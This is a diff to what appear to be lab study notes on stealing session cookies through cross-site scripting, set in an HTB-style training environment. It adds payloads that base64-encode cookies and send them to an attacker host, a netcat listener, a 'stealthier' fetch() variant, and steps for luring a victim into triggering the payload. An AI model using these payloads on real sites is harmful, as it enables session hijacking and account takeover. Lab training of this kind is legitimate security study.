@@ -105,8 +105,24 @@ A sample HTTPS>HTTPS payload example:
 ```
 <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
 ```
+Then we have to send a similar link to the victim (the endpoint where the XSS appeared):
+```
+http://xss.htb.net/profile?email=ela.stienen@example.com
+```
+Then wait for the click, we receive the cookie and we can hijack the session. :)
+## Obtaining session cookies via XSS (with Netcat)
+We can use a similar payload:
+```
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+```
+And listen with netcat:
+```
+nc -lvnp 8000
+```
+Then send our crafted URL to the victim and wait for him/her to hold his/her mouse over "test" to get the connection. <br>
+In this case the cookie is a Base64 value because of the `btoa()` function. Decode and hijack!
 
-
+*Note: We don't necessarily have to use the window.location() object that causes victims to get redirected. We can use fetch(), which can fetch data (cookies) and send it to our server without any redirects. This is a stealthier way. E.g. we can use a similar payload: `script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>`*
 
 
 
